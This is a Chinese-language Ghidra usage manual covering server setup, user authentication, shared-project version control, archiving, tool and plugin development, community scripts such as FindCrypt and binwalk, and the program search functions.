在图5-3中所显示的两行，表明使用了a0，也即是用户私钥的授权方式；而存储仓库则位于${ghidra.repositories.dir}这个变量当中，这个变量也被定义于该文件中，我们可以找到： ghidra.repositories.dir&#x3D;.&#x2F;repositories 通常来说，我们应该避免使用这个默认的仓库地址，最为正确的做法是指定一个位于Ghidra安装目录之外的文件夹并使用绝对路径。因此，我们将其改为 ghidra.repositories.dir&#x3D;D:\\test 当升级Ghidra时，我们需要将之前的参数设置从旧的server.conf复制到新的server.conf当中。我们不应该复制整个旧的server.conf文件，这可能会影响Ghidra服务的运行。 5.1.2 用户授权 Ghidra服务器支持多种授权认证模式。 1 无认证：任何被添加的用户都可以任意连接服务器。 2 本地Ghidra密码（-a0）：与被添加用户所关联的密码被维持于仓库目录的users目录当中。当用户连接服务器时，会被要求输入密码。当一个用户被添加时，默认的密码会是changeme。 3 PKI授权（-a2）：利用PKI用户证书进行授权认证。用户的证书需要是受信任的CA所颁发，并被添加到Ghidra服务器cacerts文件当中。 4 SSH密钥：当本地密码模式被使用时（-a0），SSH认证也会被支持，目前该模式只支持对无头的分析器的使用。 在我们的实例当中，我们仅使用比较易用且通用的本地密码模式（-a0）做示范。 5.1.3 服务器内存管理 我们同样可以在server.conf文件当中设置服务器最大的使用内存。 wrapper.java.maxmemory 我们可以用如下的公式来估算一个合适的最大内存值。 wrapper.java.maxmemory&#x3D;2(16+(32 FileCount&#x2F;10000) + (2 * ClientCount)) 其中FileCount指仓库中的最大文件数，ClientCount指同时连接的Ghidra客户端数量。我们可以使用Java VisualVM工具来检视服务器运行时所使用的内存。该工具不在Ghidra发行包当中。 在我们的实例当中，我们假设仓库当中最大文件数为5000个左右，且同时连接的客户端数量约为4个，那么我们根据计算得出 wrapper.java.maxmemory&#x3D;2(16+(325000 &#x2F; 10000)+（2*4))&#x3D;80 默认的maxmemory值为768（MB），因此内存应该是完全够用的，我们便不对其进行改动。 5.1.4 运行服务器 完成了以上配置之后，我们便可以安装并运行服务器。 .svrInstall.bat 这能将服务器安装为服务并开始运行。如果想要移除安装的服务器服务： .svrUninstall.bat ghidraSvr.bat文件则为我们提供了对服务器一系列的指令。可用的参数包含： console：在当前的终端窗口运行服务器。 start：开始运行安装好的Ghidra服务器服务。 stop：停止运行安装好的Ghidra服务器服务。 restart：停止并重启安装好的Ghidra服务器服务。 status：显示当前的Ghidra服务器服务状态。 比如，我们想要重启目前已经在运行的服务，输入 .ghidraSvr.bat restart 在Linux或macOS下对Ghidra服务器的搭建非常类似，只需要运行所对应的shell文件即可。 #ghidra使用手册 5.2 创建项目 之前我们完成了服务器的搭建，接下来我们会在服务器当中创建项目。首先，我们要在服务端添加用户。Ghidra服务器用于管理的脚本为svrAdmin.bat，其用法如下： svrAdmin.bat [] [-add ] [-remove ] [-reset ] [-dn “”] [-admin “”] [-list] [-users] [-migrate-all] [-migrate “”] 我们将对这些参数作出说明： ：我们通常没有必要指明该参数。服务器根路径默认取决于server.conf文件的ghidra.repositories.dir变量。 -add：用于添加用户，在我们使用的-a0模式下，用户的初始密码会被设置为changeme。该密码需要在24小时内修改以避免过期。 svrAdmin.bat -add mySID -remove：用于移除用户。该命令不会对被移除用户所作的操作历史产生影响。 svrAdmin.bat -remove mySID -reset：用于重置用户的Ghidra密码。如果一个用户的密码过期，或被遗忘，我们可以用指令将密码重置为changeme。同样的，重置后密码需要在24小时内被用户更改。 -dn：用于分配用户的标识名。使用PKI认证时，每个用户的标识名需要与他们的用户SID相关联。使用方法： svrAdmin.bat -dn mySID “CN&#x3D;MyName,OU&#x3D;AGENCY,OU&#x3D;DoD,O&#x3D;U.S.Government,C&#x3D;US” -admin：用于添加仓库管理员。服务器管理员可以用该指令指定新的仓库管理员，用法： svrAdmin.bat -admin mySID”myProject” -list：用于列出全部仓库。可以与-users一起使用以显示每个仓库的用户列表。 -users：用于所有能够访问服务器的用户。 -migrate-all：用于将所有仓库迁移至一个索引文件系统当中。迁移会与Ghidra服务器重启时发生。需要注意的是，该操作是单向的，所以我们建议在迁移之前做好仓库的备份。 -migrate：将指定的仓库迁移至索引文件系统中。用法： svrAdmin.bat -migrate “myProject” 在我们的服务器当中，我们需要先添加用户。虽说官方文档当中说明要添加SID，但实际上我们添加的内容只是简单的用户名。 命令行输入： .svrAdmin.bat -add trident 确定我们Windows防火墙的设置能够放行。服务器开启后，我们可以在另一台机器中打开Ghidra，并创建一个分享项目。打开Ghidra，点击File→New Project，选择Shared Project，并输入服务器的IP地址或是DNS名，输入端口号（我们的服务器使用了默认的13100端口）。 图5-4 创建分享项目 这里在使用时应该先创建与本机名称一样的userID 用 .svrAdmin.bat -add 创建 接下来我们输入密码（初始密码为changeme），这时将会弹出一个对话窗口提醒我们修改密码。设定完新密码之后，我们便可以创建新的仓库。 图5-5 创建仓库 接下来我们对该仓库的权限进行设置 图5-6 权限设置 再设置完仓库的本地路径，我们便完成了这个分享项目的创建。 #ghidra使用手册 5.3 项目仓库 Ghidra中的项目仓库可以被记录版本，也即是说，我们可以追踪一个项目的所有改动历史。仓库支持签入、签出、版本历史。项目仓库在有或没有Ghidra服务器的情况下，都能够使用。如果项目被关联于一个Ghidra服务器，多个用户便可以同时访问该项目当中的文件。 我们将继续以5.2当中所创建的项目仓库为例进行一步步的说明。当我们在客户端将这个共享的项目打开时，Ghidra会尝试连接到该项目所关联的服务器。如果所关联的服务器不在运行，我们仍可以在本地工作于已经签出的文件，但不能访问未签出的文件。我们可以通过项目窗口右下角的线缆图标 快速地判断是否连接到服务器。如果该图标中线缆成断开状态，我们可以点击它来尝试进行重连。 5.3.1 版本控制 我们可以在Ghidra项目窗口中选中一个或多个程序，并点击工具栏中的 图标，或是右键并选择Add to Version Control…。这将弹出一个对话窗口，我们可以在其中输入对该文件的注释。 图5-7 将项目中的crackme_example加入版本控制 勾选Keep File Checked Out，这样我们就不用在加入版本控制之后再将crackme_example签出。Apply to All按钮在我们选中了多个文件时可用，我们可以将输入的注释应用到所有将要添加到版本控制的文件之上。 如下图，我们可以看到已经签出的文件图标右下角会有一个绿色背景的勾. 而紫色背景的勾 则代表该文件为其他用户签入的新版本。 图5-8 已签出的crackme_example 签入 当我们做完改动并保存之后，便可以签入文件（我们不能签入未被改动的文件）。签入会创建该文件的一个新版本。右键选择想要签入的文件，并在工具栏当中选择签入图标 ，或者在右键菜单中选择Check In…。这将弹出一个对话窗口，我们可以在其中注释描述我们所做的改动。我们可以勾选Keep File Checked Out来接着签出该文件。我们可以勾选Create “.keep” file来在本地文件系统当中创造一个即将签入的文件的拷贝。 在一个共享的项目仓库当中，我们签入文件时，文件中的改动可能会与服务器当中最新的版本合并。在大多数情况下，合并都将是自动的，不需要任何干涉。然而，如果改动导致了冲突，我们需要在签入时解决冲突。当另一个用户签入他的文件时，我们可以通过导向标记查看从我们签出文件之后他所做的改动。潜在的冲突将以红色标出。我们接下来会更详细地介绍合并的过程。 签出 我们可以选择文件后点击 图标，或者在右键菜单当中选择Check Out…。这将弹出一个对话窗口。 图5-9 签出文件 我们可以通过勾选Request exclusive check out来确保其他用户不能签出该文件。如果选中的文件已经被其他用户签出，我们则无法勾选该选项。在我们计划对内存映射做出操作时，勾选该选项是必要的。 撤销签出 我们有时可能希望撤销签出操作，这样我们便可以放弃所有的更改，文件也会还原到服务器当中的最新版本。选中文件，并点击 图标，或是在右键菜单当中选择Undo Checkout选项。如果我们在此之前对文件进行了更改，这将弹出一个对话窗口以确认我们的操作。 图5-10 撤销签出 类似地，勾选Save copy of the file with a .keep extension勾选框，我们可以创建一个私人的文件复制，扩展名为.keep。如果我们尝试在文件于CodeBrowser中打开时撤销签出，将会看到一个错误信息。我们必须要先关闭文件，才能撤销签出。 更新 当我们工作于一个共享项目仓库当中的文件时，我们需要时不时地更新程序以获取其他人所做出的改动。选择文件并点击 图标，或是在右键菜单当中选择Update…选项，我们便能将仓库中最新版本的程序同步于本地。如果我们的改变与最新版本中的改动产生了冲突，我们会被要求这些改动内容。 撤销劫持 当我们在本地的私人文件与仓库中存在的文件同名时，该私人文件便会被劫持。当另一个用户将文件添加到版本控制中，且我们本地存在同名私人文件时，会发生这种情况。如果想要撤销劫持，我们选中文件，并点击 图标，或者在右键菜单当中选中Undo Hijack…。这将弹出一个对话窗口。类似地，我们可以选择性地创建一个扩展名为.keep的文件复制。 查看版本历史 我们可以右键点击一个文件，并选择Show History…选项。这将弹出一个表格，显示版本创建的日期、创建用户、和版本注释。 图5-11 版本历史 我们可以在这其中方便地浏览历史中的任意版本，右键点击某个版本，并选择Open With→&lt;指定的工具&gt;，我们便可以通过指定的工具打开该版本的文件。这个版本将会以只读模式打开，我们可以对该文件作出更改，但是只能将其保存至新的名字。 此外，如果我们是仓库管理员，且该文件未被签出，我们可以删除最新或最老的版本。 查看签出 我们可以右键点击文件并选择View Checkouts…选项来查看文件被哪些用户签出。调出的表格中会显示签出日期与签出文件的版本号。 图5-12 查看签出 如果某个用户签出了某文件，且不将其签入或撤销签出，管理员可以通过右键点击并选择Terminate the checkout来终止该签出。 如果想要查看某个文件夹下所有我们签出的文件，我们需要右键点击一个文件夹，并选择Find Checkouts…。 5.3.2 权限控制 在5.2当中，我们展示了在创建一个项目仓库时，需要对权限控制进行设置。在创建完成之后，如果有管理权限，我们也能够再次对权限进行修改。只需要在项目窗口选择Project→Edit Project Access List便能够调出对权限的编辑窗口。 #ghidra使用手册 5.4 存档 我们可以通过存档当前项目（Archive Current Project）将目前打开项目的所有内容储存到指定的文件名下。开始存档前，我们需要将所有运行的工具关闭。 5.4.1 为什么要存档 1 项目会被保存至一个对不同的Ghidra版本都兼容的文件格式。 2 存档一个项目并不会将该项目移除，对该项目的继续使用没有影响。 3 这是一个非常简单高效的备份方式。 5.4.2 如何存档 1 关闭所有工具。 2 在项目窗口，选择File→Archive Current Project…。 3 这将弹出一个对话窗口，在其中指定存档文件保存的位置与名称，并点击OK。 图5-13 存档 5.4.3 恢复存档 我们可以将存档的项目文件恢复为一个活跃的项目。 1 如果当期有打开的项目，选择File→Close Project将其关闭。 2 选择File→Restore Project…。 3 在弹出的窗口中指定想要恢复的存档文件（Archive File）、新项目的位置（Restore Directory）与名称（Project Name）。 图5-14 恢复存档 4 如果恢复项目的位置存在一个同名项目，将会弹出窗口提醒我们，项目已存在（Project Exists）。 #ghidra使用手册 6.1 默认工具 一个Ghidra的工具即是一系列插件（Plugins）的集合。我们可以通过组合不同的插件创建工具。Ghidra提供了很多的插件，不过我们也可以创建自己的插件并将其添加到我们的工具当中。 6.1 默认工具 之前介绍的CodeBrowser即是Ghidra所提供的默认工具，其默认显示于我们的工具箱当中，且包含了所有的核心插件。图标为 。我们可以在任何时候将其重新导入到工具栏当中。操作如下： 1 在项目窗口中选择Tools→Import Default…。 2 在弹出的对话窗口中选择一个默认工具（CodeBrowser，或是Version Tracking），并点击OK。 3 默认工具将被添加至工具栏当中。如果该默认工具已经存在，那么新添加的默认工具名称将会带上一个数字后缀，比如: CodeBrowser_1。 #ghidra使用手册 6.2 工具管理 6.2.1 创建工具 创建工具能够创建一个空的工具（不含任何插件）。我们可以根据工具的用途来给它添加插件。一个创建工具的整体过程应该如下： 1 确定我们对该工具的需求。 2 确定现存的插件是否能够满足我们的需求。如果现存的插件无法提供对应的功能，我们可能需要自己编写插件。 3 将这些插件添加到现存的工具或是一个新的工具中。 创建新工具的具体操作为： 1 在项目窗口，选择Tool→Create Tool…选项。 2 这将显示一个空的工具，并弹出配置工具的对话窗口。 图6-1 配置工具窗口 6.2.2 配置工具 如图6-1所示，我们可以在配置工具的窗口下对工具进行配置，即是在一个工具上增加&#x2F;移除插件包，或是单独的插件。 我们可以通过勾选插件包对应的勾选框，增添（或移除）该包中的所有插件。需要注意的是，Experimental包不能够整包添加，我们只能够单独添加其中的插件。点击Configure链接，我们便可以对插件进行单独的添加或移除。 图6-2 单独添加插件 6.2.2 将工具保存至工具栏 我们可以在工具当中，选择File→Save Tool，来保存该工具。 如果想要将工具保存为另外的名字，或是想要更换工具图标： 1 在工具中选择File→Save Tool As…。 图6-3 保存工具 2 在弹出的对话窗口中输入新的工具名字。 3 选择新工具的图标，并点击Save。 6.2.3 导出工具 我们可以将工具以XML文件导出，这样便可以与其他用户分享我们的工具。 在项目窗口中导出工具： 1 选择File→Export Tool，并选中想导出的工具。 2 指定导出的文件位置与名称。 或者是， 1 右键点击想要导出的工具图标，选择Export…。 2 指定导出的文件位置与名称。 需要注意的是，如果工具包含了Ghidra所不含的插件，比方说，我们自己写的新插件。这种情况下我们需要将包含插件类文件的jar文件跟XML文件一起发布。 6.2.4 导入工具 我们可以将被导出的XML文件导入至Ghidra的工具栏当中。 1 在项目窗口，选择Tools→Import Tools to Tool Chest…。 2 选择一个.tool或是.obj扩展名的文件，并点击Import。 3 工具将被添加至工具栏当中。如果该工具已经存在，那么新添加的工具名称将会带上一个数字后缀，比如: CodeBrowser_1。 6.2.5 编辑插件路径 我们在之前提到过，如果想要将含有自己所编写的新插件的工具发布，需要将包含插件类文件的jar文件一起发布。而想要导入该工具的用户则需要将该jar文件放置于Ghidra的插件路径下。 如果我们想要增添一个插件路径： 1 在项目窗口当中选择Edit→Plugin Path…。 2 一个编辑插件路径的对话窗口将会显示； 图6-4 编辑插件路径 在该窗口当中，选择Add Jar…或是Add dir…按键来选择一个jar文件或是一个目录。在文件选择对话中选择jar文件或是目录。 1 点击Apply（关闭窗口）或OK（不关闭窗口）。 更改搜索顺序 我们可以更改用户插件路径列表中的搜索顺序，选择一个插件路径，并点击向上或向下的箭头图标。搜索顺序由上至下。 设置用户插件Jar目录 我们可以在User Plugin Jar Directory处，输入一个绝对路径，或是点击…按键，在文件系统中选择一个目录。 6.2.6 工具连接 Ghidra中不同的工具能够分享数据并动态地互动，我们可以说这些工具是被连接的。工具通过工具事件（tool events）被连接。当我们： 1 打开或关闭程序。 2 将光标移动至程序中的另一位置。 3 在程序当中做出选择。 工具便会生成事件。 工具的连接是有方向性的。也就是说，我们可以将工具A与B单方向地连接，工具B能够接收使用A生成的事件，而A不能够接收使用B所生成的事件。我们也可以将A与B双向的进行连接。 自动的工具连接 当我们： 1 将一个运行工具的图标拖动至另一个运行工具当中。 或是 2 在工具栏中将一个工具图标拖动到一个运行工具的图标上。 工具会被自动且双向地连接。这也是连接工具最快捷的方式。 手动的工具连接 我们同样也可以手动地连接工具。在项目窗口当中选择Tools→Connect Tools…。 这将弹出用于手动创建工具连接的对话窗口。 1 在Event Producer列表当中选择生成事件的工具。 2 在Event Consumer列表当中选择接收使用事件的工具。 3 在Events Names列表当中选择需要被连接的事件。 需要注意的是，只有在我们想选择具体的连接事件时，手动的工具连接才会显得有用。如果只是想将所有工具的所有事件进行双向的连接，我们可以简单地点击Connect All按键。 #ghidra使用手册 6.3 插件开发 有时，Ghidra自带的插件集合不能够满足我们的需求，这时我们可能需要自己开发插件。 6.3.1 基础 在开始之前，我们建议在CodeBrowser当中选择Help→Ghidra API Help来阅读Ghidra API的官方文档。 当一个Ghidra插件脚本运行时，当前程序的状态会被处理为五个对象： 1 currentProgram：活跃的程序。 2 currentAddress：工具中当前光标位置的地址。 3 currentLocation：工具中当前光标位置的程序位置，如果无程序位置存在，则为NULL。 4 currentSelection：工具中当前的选择，如果无选择存在，则为NULL。 5 currentHighlight：工具中当前的高亮显示，如果无高亮显示存在，则为NULL。 Ghidra基于Java编写，而其插件可以用Java或是Jython进行编写。 6.3.2 脚本编写 我们将先对编写脚本进行介绍。 基于以上的基本了解，我们现在打开脚本管理器，Window→Script Manager。我们在此用ghidra_basics.py文件来做示例。右键并选择Edit with Basic Editor，我们便可以使用Ghidra提供的基本编辑器将其打开。 图6-5 ghidra_basics.py 我们可以看到，该文件中介绍了一系列Ghidra API的使用方法。 接下来我们可以尝试创建一个新的脚本。点击Create New Script 图标，并选择使用Java或是Python，选择文件路径与名称。 图6-6 新创建的Python脚本 一个编辑器将会弹出。我们可以在相应位置输入该脚本的元数据。标签内容如下： @author: 说明脚本作者。 @category: 指示脚本目录路径。目录被用.符号分级。比如： @category categoryA.categoryB @keybinding: 该标签指示激活该脚本的键位绑定。格式为ctrl alt shift A-Z,0-9,F1-F12。比如： @keybinding ctrl shift A @keybinding ctrl alt F12 @menupath: 指示该脚本在顶部菜单中的路径。路径层级用.区分。比如： @menupath File.Run.My Script @toolbar: 工具栏中将创建一个用于启动该脚本的按键，该标签指定了该按键的图标。脚本管理器会尝试在脚本目录与Ghidra安装目录下搜索该图像，如果该图像不存在，会使用默认的图标。比如： @toolbar myScriptImage.gif 接下来我们会编写一个简单的Python脚本， 图6-7 简单的Python脚本 此处，我们使用getName()获取当前程序的名称，并使用popup()将字符串在弹出窗口中显示。更多的API请参考Ghidra API的官方文档，通过Help→Ghidra API Help打开。保存该脚本并运行，可以看到： 图6-8 弹出窗口 如果使用print，则输出会显示于CodeBrowser中的控制台界面内。 使用Eclipse 如果想要高效地开发真正实用、更加复杂的Ghidra脚本或是插件，我们需要用到GhidraDev Eclipse插件。该插件提供Ghidra与Eclipse间的交互。 我们在脚本管理器当中右键点击一个脚本，并选择Edit with Eclipse，如果是第一次打开，我们会被要求输入Eclipse的安装目录。 图6-9 设置Eclipse路径 如上图，勾选Automatically Install GhidraDev以自动安装GhidraDev插件。GhidraDev插件以及其文档位于&lt;Ghidra安装目录&gt;&#x2F;Extensions&#x2F;Eclipse&#x2F;GhidraDev&#x2F;。 图6-10 创建项目 我们在弹出的窗口当中进行进一步的设置，点击Finish完成设置。 我们便可以在Eclipse当中对脚本进行编辑。需要注意的是，我们只应当在Ghidra的脚本管理器当中运行脚本，而不应该从Eclipse中运行。 我们同样可以在Eclipse当中对脚本进行调试。 1 将目前打开的Ghidra关闭。 2 点击Eclipse中的Debug As…图标 ，并选择Ghidra。 3 仍然从Ghidra的脚本管理器中运行脚本。 我们同样可以在Eclipse中使用Python来编写Ghidra插件，开始之前我们需要安装Eclipse上的PyDev插件。 6.3.3 插件开发 在非常多的情况下，编写脚本并从脚本管理器当中运行便能够满足我们的需求。但有时我们可能需要一个更加直观且完整的插件以供我们制作一个新的工具。GhidraDev支持对于插件的开发，我们在安装并设置好了的GhidraDev（见6.3.2）当中，选择GhidraDev→New→Ghidra Module Project，并创建一个项目。 图6-11 创建项目 可以看到，该新创建的扩展项目含有以下内容。 图6-12 文件内容 src&#x2F;main&#x2F;java src&#x2F;main&#x2F;resources 这两个文件夹包含了该扩展项目的Java源代码。 src&#x2F;main&#x2F;help 该文件夹存放对于该扩展的在线帮助内容，包括CSS与HTML文件。 ghidra_scripts&#x2F; 存放该扩展的脚本。 data&#x2F; 存放该扩展的数据文件。 lib&#x2F; 存放该扩展的外部Java依赖。如果不存在外部的依赖，我们可以将该目录删除。 示例 接下来我们将开发一个简单的Ghidra插件作为示例。更加详尽的内容请参考Ghidra的API文档。我们选中 src&#x2F;main&#x2F;java&#x2F;myproject&#x2F;MyProjectPlugin.java 我们在此对自定义插件的内容进行修改。 图6-13 插件描述 之后我们对窗口中的组件进行简单的修改。 图6-14 窗口组件 接下来我们可以像对脚本进行调试一样，对该插件模组进行调试。确保没有正在运行的Ghidra后, 点击 图标。 进入Ghidra的工具中后，点击File→Configure，在Experimental类别中，勾选上我们新编写的插件，之后在Window中，将该插件打开。 图6-15 勾选该插件 图6-16 打开插件 可以看到我们的插件窗口。当然这只是一个简单的示例，想要开发能够满足自己特定需求的插件，我们可以参考Ghidra的API文档，而更为直观的例子，我们可以从开源项目的（访问Github官网，并搜索Ghidra找到Ghidra的开源项目) &#x2F;tree&#x2F;master&#x2F;Ghidra&#x2F;Extensions&#x2F;sample&#x2F;src&#x2F;main&#x2F;java&#x2F;ghidra&#x2F;examples 文件夹当中找到。 eclipse 实在是太老了，可能之后有人会开发其他方式的 #ghidra使用手册 6.4 扩展实例 开源社区已经为Ghidra编写了不少实用的脚本或是插件，接下来我们将对其中几个进行介绍。 6.4.1 FindCrypt-Ghidra IDA中比较著名的插件，FindCrypt，为Ilfak Guilfanov（IDA Pro 的主要开发者之一）本人编写，用于快速的查找目标当中的加密函数引用，在逆向工程的领域尤其有用。 而该插件被开发者d3v1l401移植到了Ghidra当中，将其编写成了一个Ghidra脚本，我们可以访问Github官网，并搜索FindCrpyt-Ghidra以找到该项目。 安装 Windows： 1 将FindCrypt.java移动到 &lt;Ghidra安装目录&gt;GhidraFeaturesBytePatternsghidra_scripts 2 将findcrypt_ghidra（该脚本的数据库目录）移动到 C:Users我们的用户 3 确保Ghidra拥有对于findcrypt_ghidra目录的读写权限。 Linux： 1 将FindCrypt.java移动到 &lt;Ghidra安装目录&gt;&#x2F;Ghidra&#x2F;Features&#x2F;BytePatterns&#x2F;ghidra_scripts 2 将findcrypt_ghidra（该脚本的数据库目录）移动到~&#x2F; 3 确保Ghidra拥有对于findcrypt_ghidra目录的读写权限。 使用 我们打开脚本管理器，搜索FindCrypt.java，并运行该脚本。 图6-17 运行结果 该插件将运行结果输出在了一个弹出窗口当中。 6.4.2 binwalk 同样来自于开源社区的binwalk.py脚本，允许我们在Ghidra中对当前程序运行binwalk工具，并将运行结果标记于陈列窗口中。该脚本的代码只有39行。我们可以访问Github官网，并搜索创作者为ghidraninja，名称为ghidra_scripts的开源项目。并找到其中的&#x2F;blob&#x2F;master&#x2F;binwalk.py文件。 图6-18 binwalk 我们需要提前确保binwalk位于$PATH当中。 #ghidra使用手册 7.1 搜索 在之前的章节当中，我们对于各个插件进行了单独的介绍。在这一章当中，我们会介绍如何在一个程序当中进行搜索与导向。 Ghidra提供了一系列的搜索功能。搜索程序内存功能能让我们在程序内存中快速的寻找字节样式。搜索程序文本功能可以在陈列窗口的不同部分，如注释、标签、助记符中搜索字符串。搜索字符串功能则可以搜索程序内存当中潜在的ASCII字符串。 7.1.1 搜索内存 搜索内存（Search Memory）功能在程序内存定位字节。该搜索基于输入的值，该值可以为十六进制、十进制或是字符串。对于字符串的搜索同样支持使用正则表达式。 1 在工具中，选择Search→Memory，这将打开如下的窗口。 图7-1 搜索内存 1 选择输入值的格式，并输入值。 2 选择Next寻找下一个出现的搜索值，选择Previous寻找上一个，或是选择Search All寻找全部。 搜索格式 Hex 十六进制: 输入的值为一串十六进制数。我们可以用.或是?来匹配任意的单个十六进制位。 String 字符串： 图7-2 字符串格式 我们可以在Format Options处选择指定的编码，启用或者禁用大小写敏感。同时我们可以通过勾选Escape Sequences选项来允许转义字符出现于搜索值当中，比如n。 Decimal 十进制： 图7-3 十进制 我们在靠中间的面板中选择该十进制数的格式： Byte：定点的8位数字，即一个字节（-128 ~ 255）。 Word：定点的16位数字（-32768 ~ 65535）。 DWord：定点的32位数字。 QWord：定点的64位数字。 Float：浮点32位数字。 Double：浮点64位数字。 我们只能够输入满足该格式的十进制数字。 Binary 二进制 输入的值为一串二进制数。我们可以用x、?或是.来代表任意的单个二进制位。 Regular Expression 正则表达式 输入值会被解释为Java正则表达式，并将所有的内存视为一个字符串来进行匹配。使用正则表达式时，我们只能进行向前匹配。 内存区块类型 我们可以选择想要进行搜索的内存区块。Ghidra会将来自于程序的文件头中的额外信息储存于特别的内存区块当中，这些区块不位于当前程序的地址空间当中。 Loaded Blocks：选择该选项以只搜索已经加载的内存区块（将会在实际的该程序运行实例当中出现的内存区块）。 All Blocks：将会搜索所有的内存区块。 选择范围 Search All：选择该选项以在所有内存中搜索。 Search Selection：当该选项被选择时，搜索范围将被限制于工具中当前的选择内容，只有当我们在工具中作出了选择时，该选项才可用。 代码单元范围 点击Advanced&gt;&gt;展开高级选项，便能看到该区域（Code Unit Scope）。 Instructions：搜索指令。 Defined Data：搜索定义的数据。 Undefined Data：搜索未定义的数据。 7.1.2 搜索程序文本 搜索程序文本（Search for Program Text）功能允许我们对函数、注释、标签、指令以及定义的数据当中的文本字符串进行搜索。我们可以一个接一个地进行搜索，也可以生成一个搜索结果的列表。选择Search→Program Text以打开该窗口。 图7-4 搜索文本 我们可以在输入栏中输入我们想要搜索的字符串，类似地，我们可以使用?代表任意单个字符，并用代表任意字符。需要注意的是，该输入区域不支持正则表达式的使用。如果我们想要搜索或是?，则需要使用符号对其进行转义，比如说：* 此外，可以看到，窗口中有以下这些选项。 搜索类型 我们可以看到搜索类型（Search Type）区域有两个可选选项：Program Database Search与Listing Display Search。 Program Database Search选项在该程序数据库当中进行搜索。而Listing Display Search选项则在我们于陈列窗口所看到的东西当中进行搜索。他们会生成不同的结果，因为陈列窗口包含了派生的以及自动生成的信息，而这些信息不存在于数据库当中。数据库也可以包含不显示于陈列窗口当中的信息。以下的表格总结了它们的优缺点。 |Program Database Search| Listing Display Search 优点| 更快；可以得到不在陈列窗口显示的信息。| 搜索的结果反映我们在陈列窗口中可见的信息；包括派生和自动生成的信息都可以被搜索，而这些信息不处于数据库中。 缺点 | 搜索结果可能与陈列窗口中显示的内容不匹配；搜索也被限制于指定的区域。| 可能比数据库搜索要慢非常多。比如说，当我们在一个含有一个注释的大程序中进行搜索，数据库搜索可以立即找到该注释，而陈列窗口搜索在找到该注释前，需要遍历每一个地址；不能找到未显示于陈列窗口的信息。 默认的情况下，数据库搜索会被选中。 渐进式搜索 我们可以渐进地进行搜索： 点击Next或是Previous来向前或是向后进行搜索，搜索的起始点为我们在陈列窗口中的当前位置。 如果找到一个匹配，陈列窗口中当前的位置会被移动到匹配出现的位置。如果未找到匹配，将会出现Not found提醒。 图7-5 未找到匹配 在一个大的程序中进行搜索可能会花一些时间，我们随时可以点击位于搜索进度栏右侧的Cancel图标，来停止进行中的搜索。 图7-6 取消搜索 搜索全部 除了进行渐进式地搜索，我们也可以寻找程序（或是选中内容）当中的所有匹配。点击Search All按键，这将弹出一个显示所有匹配的表格。 图7-7 搜索全部 当在一个比较大的程序上进行该操作时，结果的表格将先于搜索完成弹出，而表格会随着搜索的进度而更新。类似地，我们也可以取消搜索，取消后，已经得到的匹配结果将仍显示于表格当中。 需要注意的是，我们可能得到同一个地址的多个入口。比如，在一个注释当中，一个字符串可能出现多次。当我们在结果表格中点击一行时，我们在陈列窗口当中的光标会被移动至相应位置。 其他设置 搜索全部功能存在预设的匹配数量上限，默认值为500。在找到500个匹配值后，搜索将会自动停止。我们可以匹配数量上限值： 1 在工具中选择Edit→Tool Options…，并找到其中Search栏。 图7-8 搜索设置选项 2 如图，在其中Search Limit栏，输入匹配数量上限。 3 点击OK或Apply。 类似地，在该面板中，我们也可以对搜索结果的高亮显示做出自定义。该处的设置同样应用于7.1.1当中的搜索内存功能。 默认的搜索顺序 该功能中，默认的搜索顺序如下： 1 函数 2 区块注释 3 前置注释 4 标签 5 指令助记符 6 指令操作数 7 定义的数据助记符 8 定义的数据值 9 行末注释 10 可重复注释 11 后置注释 而在一个函数当中，顺序如下： 1 函数注释 2 函数签名 3 栈变量类型 4 栈变量名称 5 栈变量便宜 6 栈变量注释 需要注意的是，即便我们更改了陈列窗口中的显示顺序，搜索顺序也不会改变，这可能导致我们在进行渐进式的搜索时，光标会进行前后的移动，而不是预期的，只向搜索的方向进行移动。 7.1.3 搜索字符串 搜索字符串（Search for Strings）功能在当前程序或是指定的选中内容中搜索可能的ASCII或Unicode字符串。结果将被展示于一个表格当中。 在工具当中选择Search→For String…以打开搜索字符串的对话窗口。 图7-9 搜索字符串 如图，我们可以按需对以下选项做出修改（选择）。 Minimum Length：决定将显示字符串的最小长度。 Alignment：搜索将只返回从输入的对齐值开始的结果。 Require Null Termination：勾选时，搜索返回的字符串一定要以Null(&#96;&#96;)结尾；未勾选时，则无特定要求。 Pascal Strings：勾选时，只搜索有效的pascal, pascal 255，或是pascal unicode字符串。 Word Model：指定用于检测可能的单词的字符串分析模型文件。默认的文件为StringModel.sng。搜索结果表格中将会显示一列Is Word，以指示该字符串是否为单词。我们可以将该栏留空以将其忽略。而用户定义的分析模型文件应当被放置于Ghidra&#x2F;Features&#x2F;Base&#x2F;data&#x2F;stringngrams目录下。 Memory Block Types：指定搜索加载的内存区块或是全部内存区块。 Selection Scope：指定在整个地址空间中进行搜索，或是在当前用户选中的内容中进行搜索。 搜索结果 按需设置好这些选项后，我们按下Search，搜索的结果将会以一个表格的形式弹出。 图7-10 字符串搜索结果 结果中的列如下： Defined：指示该字符串的状态。我们可以将光标移动到图标上查看图标所代表的状态。 Location：字符串所处地址。 Label：字符串所处位置的标签。 String View：显示该字符串。 String Type：显示该字符串类型。Ghidra支持ASCII字符串，Unicode字符串，pascal字符串，pascal 255字符串与pascal unicode字符串。 Length：字符串中的字符个数。 Is Word：当我们在选项中选择了一个单词分析模型时，该列会显示。指示该字符串是否为单词或是一串单词。 创建字符串 我们可以通过表格中的Make String来创建字符串。选中表格中的一行或多行，并按需修改以下选项。 图7-11 创建字符串 Offset：允许用户指定该字符串或是字符列表的起始点。对于pascal字符串，该选项会被忽略，因为更改偏移会让pascal字符串无效。 Auto Label：当勾选时，创建字符串时一个标签将被自动生成。 Include Alignment Nulls：当勾选时，创建的字符串会包含用于对齐的Null值。 Truncate if Needed：勾选时，如果存在冲突，创建截断的字符串。 按需设置好选项后，我们可以按下 Make String：在所选地址创建字符串。 Make Char Array：在所选地址创建一个字符的数组。 7.1.4 搜索地址表 搜索地址表（Search for Address Tables）功能搜索当前程序中可能的地址表。搜索结果将会被显示以一个列表的形式显示。 在工具中选择Search→For Address Tables…选项以搜索地址表。 图7-12 搜索地址表 搜索选项如下： Search Selection：显示搜索范围于陈列窗口中当前的选中内容（只有在陈列窗口中做出选择后，该勾选框才可选）。 Minimum Length：决定显示的地址表的最小长度。 Alignment：地址表必须按给定的字节对齐。 Skip Length：在匹配的地址间跳过的字节数。 按需设置好各个选项后，我们便可以按下Search以开始寻找。类似地，我们可以按下进度栏右侧的Cancel图标来终止搜索。 搜索结果 搜索的结果当中含有如下的列： Location：地址表的位置。 Label：地址表所处位置的主要标签。 